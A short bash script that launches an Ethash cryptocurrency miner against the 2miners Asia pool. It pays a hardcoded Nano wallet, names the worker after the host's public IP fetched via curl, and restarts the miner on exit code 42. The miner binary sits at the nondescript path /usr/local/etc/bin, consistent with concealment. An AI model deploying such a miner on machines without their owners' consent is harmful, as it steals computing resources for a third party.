#! /bin/bash

ETHPOOL=asia-eth.2miners.com:2020
ETHWALLET=nano_3ffz4agkarzet5rsjk7rif4788xkwr1myw91y8946q73cf637orq857e6isy
ETHWORKER=$(echo \"$(curl -s ifconfig.me)\" | tr . _ )


#################################
##  End of user-editable part  ##
#################################


/usr/local/etc/bin --algo ETHASH --pool $ETHPOOL --user $ETHWALLET --worker $ETHWORKER $@
while [ $? -eq 42 ]; do
    sleep 10s
    /usr/local/etc/bin --algo ETHASH --pool $ETHPOOL --user $ETHWALLET --worker $ETHWORKER $@
done
